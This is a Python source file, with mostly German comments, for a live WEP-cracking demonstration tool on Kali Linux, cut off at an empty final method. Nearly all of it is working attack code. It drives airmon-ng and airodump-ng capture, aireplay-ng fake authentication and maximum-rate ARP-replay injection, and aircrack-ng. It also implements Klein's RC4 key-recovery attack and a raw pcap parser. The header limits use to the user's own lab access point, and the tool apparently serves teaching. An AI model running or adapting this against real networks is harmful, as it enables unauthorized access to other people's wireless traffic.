#!/usr/bin/env python3
"""
WEP Crack Visualizer -- LIVE presentation tool (Kali Linux)
===========================================================

One screen for the whole WEP demo:

  1. SCAN   -- live list of nearby APs; type part of your SSID to highlight it
              green, click "Dieses AP verwenden" the moment you see it
              (manual stop, no fixed timeout).
  2. CRACK  -- the per-byte VOTE leaderboard (the "overview from before"),
              driven by the REAL IV count from your capture. An "Inject
              Traffic" button fires ARP-replay on demand. When aircrack-ng
              recovers the key, every byte snaps to the REAL recovered value.

   LEGAL / ETHICAL SCOPE
   Point this only at your own lab AP (e.g. the WNR2200 on WEP), on an
   isolated network. Attacking networks you don't own is illegal.

Honesty note (kept on screen in live mode)
------------------------------------------
The candidate animation is a faithful *representation* of WEP's statistical
(PTW) attack, paced for teaching. The values that lock in green are the real
key recovered by aircrack-ng. Real WEP cracking is near-instant once enough
IVs are captured -- that speed is itself the lesson.

Modes:
  MODE = "live"  real capture/inject/crack (needs sudo + injection-capable card)
  MODE = "sim"   self-contained rehearsal/fallback (runs anywhere)

Start (live):  sudo python3 wep_demo.py
Start (sim) :  python3 wep_demo.py         # set MODE="sim" below
"""

import os
import random
import shutil
import struct
import subprocess
import threading
import time
import glob
import csv as csvmod
import tkinter as tk
from tkinter import font as tkfont
from tkinter import filedialog

# ======================================================================
# CONFIG
# ======================================================================
MODE = "live"             # "live" or "sim"
DEFAULT_IFACE = "wlan0"   # your managed interface (airmon-ng will enable monitor)
KEY_BITS = 64             # fest auf 64-bit (5 Byte) — schnell für die Demo
FORCE_KEYLEN = 64         # aircrack fest auf diese Länge (-n), zeigt 5 KB
CRACK_MIN_IVS = 100       # ab so vielen IVs versucht aircrack eine Schätzung
ADAPTER_MODULE = "mt7921u"  # Kernel-Modul deiner Karte für den Reset
RESET_ADAPTER = True      # bei jedem Scan-Start den Adapter zurücksetzen
KEY_ATTACK = "korek"      # "korek" = pur (Vote-Rennen findet auch den Key) |
                          # "ptw" = Key schneller, Tabelle bleibt KoreK

# Zwei-Phasen-Ansatz: erst schnell capturen, dann Crack aus den Daten abspielen
CAPTURE_TARGET_IVS = 50000   # ab so vielen IVs automatisch zur Crack-Phase
SNAPSHOT_EVERY_IVS = 4000    # alle N neuen IVs einen Capture-Schnappschuss sichern
REPLAY_STEP_SECS = 2.0       # (alt) Tempo pro Schritt
REPLAY_DURATION_SECS = 35    # Gesamtdauer der LIVE-Vote-Akkumulation (größer = langsamer)

CANDIDATES_SHOWN = 10
NUM_DECOYS = 7
LOCK_MARGIN = 0.25
LOCK_MIN_VOTES = 45

# sim pacing
PASSIVE_IV_RATE = 20
INJECT_IV_RATE  = 1100
INJECT_BURST_SECS = 6

# live file prefixes
SCAN_PREFIX = "/tmp/wepscan_%d" % int(time.time())
CAP_PREFIX  = "/tmp/wepcap_%d"  % int(time.time())

SIM_TARGET_KEY_HEX = "1A2B3C4D5E6F70819A0BCDEF12"

# theme
BG="#0b0f0c"; PANEL="#121a14"; FG="#d6ffe0"; DIM="#5f7d67"; ACCENT="#39ff88"
WARN="#ffd166"; BAR_BG="#1d2a22"; LEAD="#9ad6ff"; LOCKED="#39ff88"; DECOY="#4a6553"


def _hex_to_bytes(h):
    h = h.replace(":", "").replace(" ", "")
    return [int(h[i:i+2], 16) for i in range(0, len(h)-1, 2)]


# ======================================================================
# Kleins WEP-Angriff — selbst gerechnet (verifiziert: 5/5 Bytes @ 50k IVs)
# Bekannter Klartext LLC/SNAP:  AA AA 03 00 00 00 08 ...
#   -> Z[k] = Chiffre[k] XOR Klartext[k], k = 0..6
# ======================================================================
# Nur die 6 ZUVERLÄSSIGEN LLC/SNAP-Klartext-Bytes. Byte 6 (EtherType) variiert je
# nach Traffic und ist NICHT verlässlich 0x08 -> daher nur 0..5 nutzen.
SNAP_PLAINTEXT = [0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00]


def _rc4_ksa(key):
    S = list(range(256)); j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    return S


def _rc4_prga(S, n):
    S = S[:]; i = j = 0; out = []
    for _ in range(n):
        i = (i + 1) % 256; j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(S[(S[i] + S[j]) % 256])
    return out


def _key_verifies(secret, packets, checks=6, sample=160):
    """Prüft einen Schlüssel: entschlüsselt er bei vielen Paketen den bekannten
    SNAP-Klartext (AA AA 03 00 00 00)? Mehrere Treffer -> korrekt.
    Falsch-Positiv-Chance ~1/256^6 pro Paket."""
    L = len(SNAP_PLAINTEXT)
    ok = 0
    for (iv, Z) in packets[:sample]:
        ks = _rc4_prga(_rc4_ksa(list(iv) + list(secret)), L)
        if all(ks[k] == Z[k] for k in range(min(L, len(Z)))):
            ok += 1
            if ok >= checks:
                return True
    return False


def _klein_candidate(iv, secret_prefix, idx, Z):
    """Kleins Schätzung für Schlüssel-Byte an Voll-Key-Index idx."""
    known = list(iv) + list(secret_prefix)
    S = list(range(256))
    j = 0
    for i in range(idx):
        j = (j + S[i] + known[i]) % 256
        S[i], S[j] = S[j], S[i]
    Sinv = [0] * 256
    for a in range(256):
        Sinv[S[a]] = a
    z = Z[idx - 1]
    return (Sinv[(idx - z) % 256] - j - S[idx]) % 256


def klein_recover(packets, secret_len=5, checkpoints=16, progress=None):
    """packets: [(iv[3], Z)] mit Z = bekannte Keystream-Bytes (len = len(SNAP)).
    -> (frames, key_bytes, verified).
    Klein holt die Bytes, deren Z[idx-1] im bekannten Klartext liegt; die
    restlichen (letztes Byte) werden per Brute-Force gegen den Klartext bestimmt."""
    import itertools
    n_total = len(packets)
    L = len(SNAP_PLAINTEXT)               # 6 sichere Klartext-Bytes (Z[0..5])
    klein_count = min(secret_len, L - 2)  # Bytes direkt via Klein (idx 3..6 -> 4)
    secret = []
    per_packet_cand = []
    byte_votes = []
    for b in range(klein_count):
        if progress:
            progress(b + 1, secret_len)
        idx = 3 + b
        cands = []
        votes = [0] * 256
        for (iv, Z) in packets:
            c = _klein_candidate(iv, secret, idx, Z)
            cands.append(c)
            votes[c] += 1
        secret.append(max(range(256), key=lambda v: votes[v]))
        per_packet_cand.append(cands)
        byte_votes.append(votes)
    if n_total == 0:
        return [], secret + [0] * (secret_len - klein_count), False

    # Restliche Bytes (typisch das letzte) per Brute-Force gegen den Klartext.
    # Dabei dürfen die Klein-Bytes leicht korrigiert werden (Top-Kandidaten),
    # falls eines knapp falsch war.
    if progress:
        progress(secret_len, secret_len)
    rem = secret_len - klein_count
    sample = packets[:200]
    klein_opts = [sorted(range(256), key=lambda v: byte_votes[b][v],
                         reverse=True)[:6] for b in range(klein_count)]
    tail_opts = [list(range(256)) for _ in range(rem)]
    full = None
    for ck in itertools.product(*klein_opts):          # Klein-Bytes (bestes zuerst)
        for ct in itertools.product(*tail_opts):       # restliche über alle 256
            cand = list(ck) + list(ct)
            if _key_verifies(cand, sample):
                full = cand
                break
        if full:
            break
    if full:
        secret = full
        verified = True
    else:
        secret = secret + [0] * rem        # best guess (nicht verifiziert)
        verified = False

    # Rohmaterial zurückgeben: per_packet_cand (Kandidat je Paket je Klein-Byte).
    # Die App akkumuliert daraus LIVE die Votes (Zähler läuft, Votes wachsen).
    return per_packet_cand, klein_count, secret, verified


def klein_parse_cap(path, max_pkts=200000):
    """Liest ein .cap (pcap) direkt auf Byte-Ebene und gibt [(iv, Z)] für
    WEP-Datenframes. KEIN scapy: scapy baut pro Paket einen vollständigen
    Objektbaum und braucht bei zehntausenden Frames mehrere Sekunden; dieser
    Parser liest nur die paar benötigten Bytes und ist praktisch instant.

    Deckt ab: pcap little/big-endian, Linktype 105 (raw 802.11) und 127
    (radiotap, wird übersprungen), QoS-Datenframes (+2) und ToDS&FromDS (+6).
    WICHTIG: dedupliziert nach IV — doppelte IVs (z.B. aus ARP-Replay) würden
    die Votes verfälschen. Jedes IV zählt genau einmal (wie bei aircrack)."""
    L = len(SNAP_PLAINTEXT)
    uniq = {}
    with open(path, "rb") as f:
        gh = f.read(24)
        if len(gh) < 24:
            return []
        magic = gh[:4]
        if magic in (b"\xd4\xc3\xb2\xa1", b"\xa1\xb2\xc3\xd4"):
            endc = "<" if magic == b"\xd4\xc3\xb2\xa1" else ">"
        else:                         # pcapng o.ä. — hier nicht unterstützt
            return []
        linktype = struct.unpack(endc + "I", gh[20:24])[0]
        rechdr = endc + "IIII"
        while len(uniq) < max_pkts:
            rh = f.read(16)
            if len(rh) < 16:
                break
            _, _, incl, _ = struct.unpack(rechdr, rh)
            frame = f.read(incl)
            if len(frame) < incl:
                break
            if linktype == 127:                      # radiotap-Header abschneiden
                if len(frame) < 4:
                    continue
                frame = frame[struct.unpack("<H", frame[2:4])[0]:]
            elif linktype != 105:                    # andere Linktypes: skip
                continue
            if len(frame) < 2:
                continue
            fc0, fc1 = frame[0], frame[1]
            if ((fc0 >> 2) & 0x3) != 2:              # nur Data-Frames
                continue
            if not (fc1 & 0x40):                     # nur WEP-geschützt
                continue
            hdrlen = 24
            if (fc1 & 0x01) and (fc1 & 0x02):        # ToDS & FromDS -> Addr4
                hdrlen += 6
            if (fc0 >> 4) & 0x08:                     # QoS-Data -> QoS-Control
                hdrlen += 2
            if len(frame) < hdrlen + 4 + L:
                continue
            iv = tuple(frame[hdrlen:hdrlen + 3])       # 3-Byte-IV
            enc = frame[hdrlen + 4:hdrlen + 4 + L]     # nach IV(3)+KeyID(1)
            if iv not in uniq:                         # dedup: jedes IV genau 1x
                uniq[iv] = enc
    return [(list(iv), [enc[k] ^ SNAP_PLAINTEXT[k] for k in range(L)])
            for iv, enc in uniq.items()]


# ======================================================================
# Vote model
# ======================================================================
class VoteModel:
    def __init__(self, num_bytes, target_bytes=None, allow_lock=True):
        self.n = num_bytes
        if target_bytes is None:
            target_bytes = [random.randint(0, 255) for _ in range(num_bytes)]
        self.true = list(target_bytes)[:num_bytes]
        self.allow_lock = allow_lock          # live: False until real key known
        self.revealed = None                  # real recovered key bytes
        self.votes = [dict() for _ in range(self.n)]
        self.decoys = []
        self.p_signal = []
        self.locked = [False]*self.n
        self._frac = 0.0
        for i in range(self.n):
            pool = set()
            while len(pool) < NUM_DECOYS:
                v = random.randint(0, 255)
                if v != self.true[i]:
                    pool.add(v)
            self.decoys.append(list(pool))
            self.p_signal.append(random.uniform(0.16, 0.26))
            self.votes[i][self.true[i]] = 0
            for d in self.decoys[i]:
                self.votes[i][d] = 0

    def add_ivs(self, delta):
        self._frac += delta
        d = int(self._frac)
        if d <= 0:
            return
        self._frac -= d
        for i in range(self.n):
            tv = self.votes[i]; p = self.p_signal[i]; tval = self.true[i]
            dec = self.decoys[i]
            for _ in range(d):
                if random.random() < p:
                    tv[tval] += 1
                else:
                    tv[dec[random.randint(0, len(dec)-1)]] += 1
            if self.allow_lock:
                self._check_lock(i)

    def _check_lock(self, i):
        if self.locked[i]:
            return
        r = self.top(i, 2)
        if len(r) < 2:
            return
        (lv, ln), (_, sn) = r[0], r[1]
        if ln >= LOCK_MIN_VOTES and lv == self.true[i] and (ln-sn)/ln >= LOCK_MARGIN:
            self.locked[i] = True

    def reveal(self, key_hex):
        """Snap to the REAL recovered key: lock every byte to its true value."""
        kb = _hex_to_bytes(key_hex)
        if len(kb) == self.n:
            self.revealed = kb
            self.true = list(kb)
            self.locked = [True]*self.n

    def top(self, i, k):
        return sorted(self.votes[i].items(), key=lambda kv: kv[1], reverse=True)[:k]

    def all_locked(self):
        return all(self.locked)

    def full_key_hex(self):
        src = self.revealed if self.revealed else self.true
        return ":".join("%02X" % b for b in src)

    def has_votes(self):
        """True, sobald überhaupt Votes gesammelt wurden."""
        for i in range(self.n):
            t = self.top(i, 1)
            if t and t[0][1] > 0:
                return True
        return False

    def current_guess_hex(self):
        """Aktuell führender Kandidat je Byte — die Live-Schätzung des Keys."""
        if self.revealed:
            return ":".join("%02X" % b for b in self.revealed)
        out = []
        for i in range(self.n):
            t = self.top(i, 1)
            out.append("%02X" % (t[0][0] if t else 0))
        return ":".join(out)


# ======================================================================
# Live backend
# ======================================================================
class LiveBackend:
    def __init__(self, log):
        self.log = log
        self.iface = DEFAULT_IFACE
        self.mon = None
        self.bssid = self.essid = self.channel = None
        self.mac = None
        self.ivs = 0
        self.key = None
        self.key_len = None            # 5 (64-bit) oder 13 (128-bit), auto erkannt
        self.live_key_guess = []       # aktuelle aircrack-Byte-Schätzung (echt)
        self.live_table = []           # echte Kandidaten+Votes je Byte (aircrack)
        self.live_depth = None         # echte Suchtiefe (d/D) je Byte
        self.live_header = None        # aircracks (getestete Keys, IVs)
        self._crack_logged = False     # Debug nur einmal loggen
        self.arp_count = 0        # ARPs, die der Replay abgefangen hat
        self.sent_pps = 0         # aktuelle Sende-Rate (Pakete/s)
        self.injecting = False    # arpreplay-Prozess läuft
        self.replaying = False    # ARP abgefangen -> Replay aktiv
        self._scan_proc = None
        self._cap_proc = None
        self._fakeauth = None
        self._arprep = None
        self._stop = threading.Event()
        self._cap_stop = threading.Event()   # stoppt nur Capture/Inject/Crack
        self._children = []                  # ALLE Kindprozesse, zum Killen
        self._clock = threading.Lock()
        # Zwei-Phasen: "capture" -> "computing" -> "replay" -> "done"
        self.phase = "capture"
        self._snaps = []                     # [(ivs, pfad)] gesicherte Capture-Kopien
        self.replay_frames = []              # [(ivs, table_list|None, key|None)]
        self._replay_started = False
        self._compute_progress = (0, 0)      # Fortschritt der Crack-Berechnung
        self._backup_cap = None              # gesetzt: Crack aus dieser .cap-Datei
        self.verified = False                # Schlüssel per Entschlüsselung bestätigt?
        self.packets = []                    # geparste (iv, Z) für Live-Berechnung
        self.ppc = []                        # (unbenutzt) Kandidat je Paket
        self.klein_count = 0                 # Bytes via Klein (Rest: Brute-Force)
        self.replay_total = 0                # Gesamtzahl Pakete (Zählerziel)
        self.final_key = None                # finaler Schlüssel (hex)

    def _spawn(self, cmd, **kw):
        """Startet einen Kindprozess und merkt ihn vor (für sauberes Killen)."""
        kw.setdefault("stdout", subprocess.DEVNULL)
        kw.setdefault("stderr", subprocess.DEVNULL)
        p = subprocess.Popen(cmd, start_new_session=True, **kw)
        with self._clock:
            self._children = [c for c in self._children if c.poll() is None]
            self._children.append(p)
        return p

    def _kill_children(self):
        """Killt alle gemerkten Kindprozesse hart (SIGKILL ihrer Gruppe)."""
        import os
        import signal
        with self._clock:
            procs = list(self._children)
            self._children = []
        for p in procs:
            try:
                if p.poll() is None:
                    os.killpg(os.getpgid(p.pid), signal.SIGKILL)
            except Exception:
                try:
                    p.kill()
                except Exception:
                    pass

    # --- monitor + scan ---
    def _reset_adapter(self):
        """Setzt die WLAN-Karte zurück (Modul neu laden) — behebt den
        MT7921-Firmware-Hänger, nach dem Injection nicht mehr geht."""
        self.log("Adapter-Reset: lade %s neu..." % ADAPTER_MODULE)
        subprocess.run(["airmon-ng", "check", "kill"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["pkill", "-f", "airodump-ng"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["pkill", "-f", "aireplay-ng"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["modprobe", "-r", ADAPTER_MODULE],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)
        subprocess.run(["modprobe", ADAPTER_MODULE],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(3)
        self.log("Adapter neu initialisiert.")

    def _iface_types(self):
        """Map every wireless interface -> its type (managed/monitor/...)."""
        out = subprocess.run(["iw", "dev"], capture_output=True, text=True).stdout
        res = {}; cur = None
        for line in out.splitlines():
            s = line.strip()
            if s.startswith("Interface "):
                cur = s.split()[1]; res[cur] = None
            elif s.startswith("type ") and cur:
                res[cur] = s.split()[1]
        return res

    def start_monitor(self, iface):
        self.iface = iface
        if RESET_ADAPTER:
            self._reset_adapter()
        before = self._iface_types()
        self.log("Interfaces: " + (", ".join("%s=%s" % (k, v) for k, v in before.items())
                                   or "(keine gefunden)"))
        mon_now = [d for d, t in before.items() if t == "monitor"]

        # Fall A: getipptes Interface fehlt, aber ein Monitor-Interface existiert
        # schon (häufig nach einem vorherigen Lauf -> Karte ist wlanXmon).
        if iface not in before and mon_now:
            self.mon = mon_now[0]
            self.log("'%s' nicht vorhanden — nutze bestehendes Monitor-Interface %s."
                     % (iface, self.mon))
            self.mac = self._iface_mac(self.mon)
            return True

        # Fall B: getipptes Interface ist bereits im Monitor-Modus -> direkt nehmen.
        if before.get(iface) == "monitor":
            self.mon = iface
            self.log("Monitor-Interface (bereits aktiv): %s" % iface)
            self.mac = self._iface_mac(iface)
            return True

        self.log("airmon-ng check kill (trennt WLAN)...")
        subprocess.run(["airmon-ng", "check", "kill"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        # Basis-Interface bestimmen, auf dem der Monitor-Modus aktiviert wird.
        base = iface if iface in before else None
        if base is None:
            managed = [d for d, t in before.items()
                       if (t in ("managed", "station"))
                       and d.startswith(("wlan", "wlp", "wlx"))]
            base = managed[0] if managed else (next(iter(before), iface))
            self.log("'%s' nicht gefunden — versuche stattdessen %s." % (iface, base))

        subprocess.run(["airmon-ng", "start", base],
                       capture_output=True, text=True)
        time.sleep(2)   # Treiber Zeit geben, das Interface anzulegen

        after = self._iface_types()
        mons = [d for d, t in after.items() if t == "monitor"]
        for cand in (base + "mon", base, *mons):
            if after.get(cand) == "monitor":
                self.mon = cand; break
        if not self.mon and mons:
            self.mon = mons[0]

        if not self.mon:
            self.log("FEHLER: kein Monitor-Interface. Interfaces jetzt: "
                     + (", ".join("%s=%s" % (k, v) for k, v in after.items()) or "(keine)"))
            self.log("Manuell testen: sudo airmon-ng start <iface> — dann im Feld oben "
                     "den *mon-Namen eintragen.")
            return False
        self.log("Monitor-Interface: %s" % self.mon)
        self.mac = self._iface_mac(self.mon)
        return True

    def _iface_mac(self, d):
        info = subprocess.run(["iw", "dev", d, "info"],
                              capture_output=True, text=True).stdout
        for line in info.splitlines():
            if "addr" in line:
                return line.split()[-1]
        try:
            return open("/sys/class/net/%s/address" % d).read().strip()
        except Exception:
            return None

    def scan_start(self):
        self._cleanup_glob(SCAN_PREFIX)
        self.log("Scan über 2,4 + 5 GHz läuft...")
        self._scan_proc = self._spawn(
            ["airodump-ng", "--band", "abg", "-w", SCAN_PREFIX,
             "--output-format", "csv", self.mon])

    def scan_results(self):
        files = glob.glob(SCAN_PREFIX + "*.csv")
        if not files:
            return []
        rows = []
        try:
            with open(files[0], newline="", errors="ignore") as f:
                for r in csvmod.reader(f):
                    if not r or r[0].strip() == "" or "Station MAC" in r[0]:
                        if r and "Station MAC" in r[0]:
                            break
                        continue
                    if len(r) >= 14 and ":" in r[0] and r[0].count(":") == 5:
                        bssid = r[0].strip()
                        ch = r[3].strip()
                        enc = r[5].strip()
                        essid = r[13].strip() or "<hidden>"
                        if bssid.upper() == "BSSID":
                            continue
                        rows.append((bssid, ch, enc, essid))
        except Exception:
            pass
        return rows

    def scan_stop(self):
        if self._scan_proc and self._scan_proc.poll() is None:
            self._scan_proc.terminate()

    # --- capture + inject + crack ---
    def start_capture(self, bssid, ch, essid):
        self.bssid, self.channel, self.essid = bssid, ch, essid
        self._cap_stop.clear()
        self.injecting = False
        self.replaying = False
        self.arp_count = 0
        self.sent_pps = 0
        self.ivs = 0
        self.key = None
        self.key_len = (FORCE_KEYLEN - 24) // 8   # 64->5 Byte, 128->13 Byte
        self.live_key_guess = []
        self.live_table = []
        self.live_depth = None
        self.live_header = None
        self._crack_logged = False
        self.phase = "capture"
        self._snaps = []
        self.replay_frames = []
        self._replay_started = False
        subprocess.run(["iw", "dev", self.mon, "set", "channel", str(ch)],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self._cleanup_glob(CAP_PREFIX)
        self.log("Capture auf Kanal %s, BSSID %s" % (ch, bssid))
        self._cap_proc = self._spawn(
            ["airodump-ng", "-c", str(ch), "--bssid", bssid, "-w", CAP_PREFIX,
             "--output-format", "pcap,csv", "--write-interval", "1", self.mon])
        time.sleep(1)
        self._fakeauth = self._spawn(
            ["aireplay-ng", "--fakeauth", "6000", "-o", "1", "-q", "10",
             "-a", bssid, "-h", self.mac, "-e", essid, self.mon])
        # Phase 1: NUR capturen (kein aircrack -> volle Geschwindigkeit wie wifite)
        self.phase = "capture"
        threading.Thread(target=self._iv_loop, daemon=True).start()

    def _snapshot_loop(self):
        """Sichert während des Capturns günstige Kopien des .cap bei steigenden
        IV-Ständen (nur Dateikopie, keine CPU-Last) — Basis für die Crack-Phase."""
        last = 0
        while (not self._stop.is_set() and not self._cap_stop.is_set()
               and self.phase == "capture"):
            if self.ivs - last >= SNAPSHOT_EVERY_IVS:
                caps = glob.glob(CAP_PREFIX + "-01.cap")
                if caps:
                    snap = "%s_snap_%06d.cap" % (CAP_PREFIX, int(self.ivs))
                    try:
                        shutil.copy(caps[0], snap)
                        self._snaps.append((int(self.ivs), snap))
                        last = self.ivs
                    except Exception:
                        pass
            time.sleep(0.5)

    # ---- Phase 2: Crack aus den gesammelten Daten abspielen ----
    @staticmethod
    def _parse_korek(out, expect):
        import re
        kb_re = re.compile(r'^\s*(\d+)\s+\d+/\s*\d+\s+([0-9A-Fa-f]{2})\(')
        cand_re = re.compile(r'([0-9A-Fa-f]{2})\(\s*(-?\d+)\)')
        key = None
        if "KEY FOUND" in out:
            seg = out.split("KEY FOUND")[1]
            key = seg[seg.find("[")+1:seg.find("]")].strip()
        table = {}
        for line in out.splitlines():
            m = kb_re.match(line)
            if m:
                kb = int(m.group(1))
                cands = [(int(b, 16), int(v)) for b, v in cand_re.findall(line)]
                if cands:
                    table[kb] = cands
        tl = None
        if len(table) >= expect:
            tl = [table.get(i, []) for i in range(expect)]
        return tl, key

    def begin_replay(self):
        if self._replay_started:
            return
        self._replay_started = True
        self.phase = "computing"
        self.log("Capture gestoppt — rechne Kleins Angriff aus den gesammelten IVs …")
        # Capture/Injection komplett stoppen (Karte frei), Monitor bleibt
        self._cap_stop.set()
        self._kill_proc(self._cap_proc); self._cap_proc = None
        self._kill_proc(self._fakeauth); self._fakeauth = None
        self._kill_proc(self._arprep); self._arprep = None
        self.injecting = False; self.replaying = False
        threading.Thread(target=self._compute_replay, daemon=True).start()

    def begin_replay_from_cap(self, path):
        """Backup: Crack direkt aus einer vorhandenen .cap-Datei (kein Capture)."""
        self._backup_cap = path
        self._replay_started = True
        self._cap_stop.set()          # evtl. laufenden Capture anhalten
        self.phase = "computing"
        self.log("Backup: lade %s …" % path)
        threading.Thread(target=self._compute_replay, daemon=True).start()

    def _compute_replay(self):
        secret_len = (FORCE_KEYLEN - 24) // 8
        if self._backup_cap:
            full = [self._backup_cap]
        else:
            full = glob.glob(CAP_PREFIX + "-01.cap")
        if not full:
            self.log("Kein Capture gefunden.")
            self.phase = "replay"
            return
        # 1) echte Pakete einlesen (IV + Keystream aus bekanntem SNAP-Klartext)
        self._compute_progress = (0, 1)
        self.log("Lese erbeutete Pakete (direkter Parser) …")
        try:
            packets = klein_parse_cap(full[0])
        except Exception as e:
            self.log("Paket-Parsing fehlgeschlagen (%s). Scapy installiert?" % e)
            self.replay_frames = []
            self.phase = "replay"
            return
        self.log("%d EINDEUTIGE IVs gelesen. Bereite Angriff vor …" % len(packets))
        if len(packets) < 22000:
            self.log("Nur %d eindeutige IVs — laut Formel ~22k für 50%%, ~48k für "
                     "95%%. Ergebnis evtl. falsch; mehr IVs sammeln (Client-Traffic)."
                     % len(packets))
        # Kurze Vorbereitung (Kandidaten je Paket + Schlüssel) — nötig, weil Klein
        # sequenziell ist. Danach läuft die Akkumulation LIVE und korrekt.
        def prog(a, b):
            self._compute_progress = (a, b)
        ppc, klein_count, key, verified = klein_recover(
            packets, secret_len=secret_len, progress=prog)
        key_hex = ":".join("%02X" % b for b in key) if key else None
        self.ppc = ppc
        self.packets = packets          # für die echte Brute-Force des letzten Bytes
        self.klein_count = klein_count
        self.replay_total = len(packets)
        self.final_key = key_hex
        self.verified = verified
        self.phase = "replay"
        # WICHTIG: den Schlüssel NICHT hier loggen (würde das Ergebnis vor dem
        # Live-Lauf verraten). Die Aufdeckung erfolgt am Ende des Byte-Rennens.
        if verified:
            self.log("✓ Angriff vorbereitet — Schlüssel gefunden & verifiziert. "
                     "Live-Lauf startet (Aufdeckung am Ende).")
            # Erfolgreiche Capture als Backup sichern (nur bei Live-Capture)
            if not self._backup_cap:
                try:
                    dest_dir = os.path.expanduser("~/wep_captures")
                    os.makedirs(dest_dir, exist_ok=True)
                    ts = time.strftime("%Y%m%d_%H%M%S")
                    dest = os.path.join(dest_dir, "wep_%s_%div_OK.cap"
                                        % (ts, len(packets)))
                    shutil.copy(full[0], dest)
                    self.log("Backup gesichert: %s" % dest)
                except Exception as e:
                    self.log("Backup-Sicherung fehlgeschlagen: %s" % e)
        else:
            self.log("⚠ Nicht sicher verifiziert — vermutlich zu wenige eindeutige "
                     "IVs (%d). Mehr sammeln (Ziel ~48k+)." % len(packets))

    def inject(self):
        if self._arprep and self._arprep.poll() is None:
            self.log("Injection läuft bereits.")
            return
        self.log("ARP-Replay gestartet — warte auf erstes ARP-Paket...")
        self.injecting = True
        self.replaying = False
        self.arp_count = 0
        self.sent_pps = 0
        # -x 1024 = maximale Sende-Rate (mehr Pakete/s -> mehr IVs/s)
        self._arprep = self._spawn(
            ["aireplay-ng", "--arpreplay", "-x", "1024",
             "-b", self.bssid, "-h", self.mac, self.mon],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1)
        threading.Thread(target=self._arp_watch, daemon=True).start()

    def _arp_watch(self):
        """Liest aireplay --arpreplay-Ausgabe und parst ARP-Zahl + pps.
        Typische Zeile: 'Read 1234 packets (got 56 ARP requests and 12 ACKs),
                         sent 50 packets...(500 pps)'"""
        import re
        p = self._arprep
        if not p or not p.stdout:
            return
        for line in p.stdout:
            if self._stop.is_set() or not self.injecting:
                break
            m = re.search(r'got\s+(\d+)\s+ARP', line)
            if m:
                self.arp_count = int(m.group(1))
                if self.arp_count > 0 and not self.replaying:
                    self.replaying = True
                    self.log("ARP abgefangen (%d) — Replay läuft, IVs steigen."
                             % self.arp_count)
            m2 = re.search(r'\((\d+)\s*pps\)', line)
            if m2:
                self.sent_pps = int(m2.group(1))

    def _iv_loop(self):
        while not self._stop.is_set() and not self._cap_stop.is_set():
            for c in glob.glob(CAP_PREFIX + "*.csv"):
                try:
                    with open(c, newline="", errors="ignore") as f:
                        for r in csvmod.reader(f):
                            if r and self.bssid.lower() in r[0].strip().lower():
                                self.ivs = int(r[10].strip())
                                break
                except Exception:
                    pass
                break
            time.sleep(0.3)   # schnellere Aktualisierung

    def _extract_key(self, out):
        seg = out.split("KEY FOUND")[1]
        return seg[seg.find("[")+1:seg.find("]")].strip()

    def _korek_snapshot(self, caps, budget=12.0):
        """Startet KoreK, liest den Stream mit und greift EINEN vollständigen
        Tabellen-Durchlauf (echte Votes aller Bytes) — dann Abbruch. Wiederholte
        Aufrufe auf dem wachsenden Capture ergeben die sich entwickelnde Tabelle."""
        import re
        kb_re = re.compile(r'^\s*(\d+)\s+(\d+)/\s*(\d+)\s+([0-9A-Fa-f]{2})\(')
        cand_re = re.compile(r'([0-9A-Fa-f]{2})\(\s*(-?\d+)\)')
        hdr_re = re.compile(r'Tested\s+(\d+)\s+keys.*?got\s+(\d+)\s+IVs', re.I)
        try:
            p = self._spawn(
                ["aircrack-ng", "-K", "-n", str(FORCE_KEYLEN),
                 "-b", self.bssid] + caps,
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1)
        except Exception as e:
            self.log("KoreK-Start-Fehler: %s" % e)
            return None, None, None, None
        expect = self.key_len or ((FORCE_KEYLEN - 24) // 8)
        cur, depth, header, found = {}, {}, None, None
        deadline = time.time() + budget
        try:
            while time.time() < deadline:
                line = p.stdout.readline()
                if not line:
                    break
                if "KEY FOUND" in line:
                    found = self._extract_key(line)
                    break
                h = hdr_re.search(line)
                if h:
                    header = (int(h.group(1)), int(h.group(2)))   # (keys, IVs)
                m = kb_re.match(line)
                if m:
                    kb = int(m.group(1))
                    depth[kb] = (int(m.group(2)), int(m.group(3)))  # (d, D)
                    cands = [(int(b, 16), int(v)) for b, v in cand_re.findall(line)]
                    if cands:
                        cur[kb] = cands           # neueste Werte je Byte sammeln
                    if len(cur) >= expect:
                        break
        except Exception:
            pass
        finally:
            self._kill_proc(p)
        return (cur or None), depth, header, found

    def _kill_proc(self, p):
        import os
        import signal
        try:
            if p and p.poll() is None:
                os.killpg(os.getpgid(p.pid), signal.SIGKILL)
        except Exception:
            try:
                p.kill()
            except Exception:
                pass

    def _key_loop(self):
        """Eigener Thread: findet den finalen Schlüssel.
        KEY_ATTACK='korek' (pur) oder 'ptw' (schneller)."""
        cmd_extra = [] if KEY_ATTACK == "ptw" else ["-K"]
        label = "PTW" if KEY_ATTACK == "ptw" else "KoreK"
        while not self._stop.is_set() and not self._cap_stop.is_set() and not self.key:
            caps = glob.glob(CAP_PREFIX + "*.cap")
            if caps and self.ivs > CRACK_MIN_IVS:
                p = None
                try:
                    p = self._spawn(
                        ["aircrack-ng"] + cmd_extra +
                        ["-b", self.bssid, "-n", str(FORCE_KEYLEN)] + caps,
                        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                    out, _ = p.communicate(timeout=60)
                    if out and "KEY FOUND" in out:
                        self.key = self._extract_key(out)
                        self.log("KEY FOUND (%s) -> %s" % (label, self.key))
                        return
                except Exception:
                    self._kill_proc(p)
            time.sleep(10.0)   # selten genug, um airodump nicht auszubremsen

    def _crack_loop(self):
